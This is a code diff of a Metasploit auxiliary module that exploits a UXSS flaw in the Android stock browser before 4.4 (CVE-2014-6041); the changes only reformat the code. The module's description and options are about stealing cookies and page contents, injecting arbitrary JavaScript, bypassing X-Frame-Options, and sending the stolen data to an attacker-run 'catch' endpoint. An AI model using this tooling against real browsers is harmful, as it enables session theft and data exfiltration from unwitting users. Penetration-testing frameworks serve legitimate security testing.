@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,83 +7,81 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpServer::HTML
   include Msf::Auxiliary::Report
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'Android Open Source Platform (AOSP) Browser UXSS',
-      'Description'    => %q{
-        This module exploits a Universal Cross-Site Scripting (UXSS) vulnerability present in
-        all versions of Android's open source stock browser before 4.4, and Android apps running
-        on < 4.4 that embed the WebView component. If successful, an attacker can leverage this bug
-        to scrape both cookie data and page contents from a vulnerable browser window.
+                      'Name'           => 'Android Open Source Platform (AOSP) Browser UXSS',
+                      'Description'    => %q{
+                        This module exploits a Universal Cross-Site Scripting (UXSS) vulnerability present in
+                        all versions of Android's open source stock browser before 4.4, and Android apps running
+                        on < 4.4 that embed the WebView component. If successful, an attacker can leverage this bug
+                        to scrape both cookie data and page contents from a vulnerable browser window.
 
-        If your target URLs use X-Frame-Options, you can enable the "BYPASS_XFO" option,
-        which will cause a popup window to be used. This requires a click from the user
-        and is much less stealthy, but is generally harmless-looking.
+                        If your target URLs use X-Frame-Options, you can enable the "BYPASS_XFO" option,
+                        which will cause a popup window to be used. This requires a click from the user
+                        and is much less stealthy, but is generally harmless-looking.
 
-        By supplying a CUSTOM_JS paramter and ensuring CLOSE_POPUP is set to false, this
-        module also allows running aribrary javascript in the context of the targeted URL.
-        Some sample UXSS scripts are provided in data/exploits/uxss.
-      },
-      'Author'         => [
-        'Rafay Baloch', # Original discovery, disclosure
-        'joev'          # Metasploit module
-      ],
-      'License'        => MSF_LICENSE,
-      'Actions'        => [
-        [ 'WebServer' ]
-      ],
-      'PassiveActions' => [
-        'WebServer'
-      ],
-      'References' => [
-        [ 'URL', 'http://1337day.com/exploit/description/22581' ],
-        [ 'OSVDB', '110664' ],
-        [ 'CVE', '2014-6041' ]
-      ],
-      'DefaultAction'  => 'WebServer'
-    ))
+                        By supplying a CUSTOM_JS paramter and ensuring CLOSE_POPUP is set to false, this
+                        module also allows running aribrary javascript in the context of the targeted URL.
+                        Some sample UXSS scripts are provided in data/exploits/uxss.
+                      },
+                      'Author' => [
+                        'Rafay Baloch', # Original discovery, disclosure
+                        'joev'          # Metasploit module
+                      ],
+                      'License'        => MSF_LICENSE,
+                      'Actions'        => [
+                        [ 'WebServer' ]
+                      ],
+                      'PassiveActions' => [
+                        'WebServer'
+                      ],
+                      'References' => [
+                        [ 'URL', 'http://1337day.com/exploit/description/22581' ],
+                        [ 'OSVDB', '110664' ],
+                        [ 'CVE', '2014-6041' ]
+                      ],
+                      'DefaultAction' => 'WebServer'))
 
     register_options([
-      OptString.new('TARGET_URLS', [
-        true,
-        "The comma-separated list of URLs to steal.",
-        'http://example.com'
-      ]),
-      OptString.new('CUSTOM_JS', [
-        false,
-        "A string of javascript to execute in the context of the target URLs.",
-        ''
-      ]),
-      OptString.new('REMOTE_JS', [
-        false,
-        "A URL to inject into a script tag in the context of the target URLs.",
-        ''
-      ]),
-      OptBool.new('BYPASS_XFO', [
-        false,
-        "Bypass URLs that have X-Frame-Options by using a one-click popup exploit.",
-        false
-      ]),
-      OptBool.new('CLOSE_POPUP', [
-        false,
-        "When BYPASS_XFO is enabled, this closes the popup window after exfiltration.",
-        true
-      ])
-    ], self.class)
+                       OptString.new('TARGET_URLS', [
+                                       true,
+                                       "The comma-separated list of URLs to steal.",
+                                       'http://example.com'
+                                     ]),
+                       OptString.new('CUSTOM_JS', [
+                                       false,
+                                       "A string of javascript to execute in the context of the target URLs.",
+                                       ''
+                                     ]),
+                       OptString.new('REMOTE_JS', [
+                                       false,
+                                       "A URL to inject into a script tag in the context of the target URLs.",
+                                       ''
+                                     ]),
+                       OptBool.new('BYPASS_XFO', [
+                                     false,
+                                     "Bypass URLs that have X-Frame-Options by using a one-click popup exploit.",
+                                     false
+                                   ]),
+                       OptBool.new('CLOSE_POPUP', [
+                                     false,
+                                     "When BYPASS_XFO is enabled, this closes the popup window after exfiltration.",
+                                     true
+                                   ])
+                     ], self.class)
   end
 
   def on_request_uri(cli, request)
     print_status("Request '#{request.method} #{request.uri}'")
 
-    if request.method.downcase == 'post'
+    if request.method.casecmp('post').zero?
       collect_data(request)
       send_response_html(cli, '')
     else
-      payload_fn = Rex::Text.rand_text_alphanumeric(4+rand(8))
+      payload_fn = Rex::Text.rand_text_alphanumeric(4 + rand(8))
       domains = datastore['TARGET_URLS'].split(',')
 
       html = <<-EOS
@@ -215,8 +214,8 @@ class MetasploitModule < Msf::Auxiliary
 
   def backend_url
     proto = (datastore["SSL"] ? "https" : "http")
-    myhost = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address : datastore['SRVHOST']
-    port_str = (datastore['SRVPORT'].to_i == 80) ? '' : ":#{datastore['SRVPORT']}"
+    myhost = datastore['SRVHOST'] == '0.0.0.0' ? Rex::Socket.source_address : datastore['SRVHOST']
+    port_str = datastore['SRVPORT'].to_i == 80 ? '' : ":#{datastore['SRVPORT']}"
     "#{proto}://#{myhost}#{port_str}/#{datastore['URIPATH']}/catch"
   end
 
@@ -236,5 +235,4 @@ class MetasploitModule < Msf::Auxiliary
   def run
     exploit
   end
-
 end
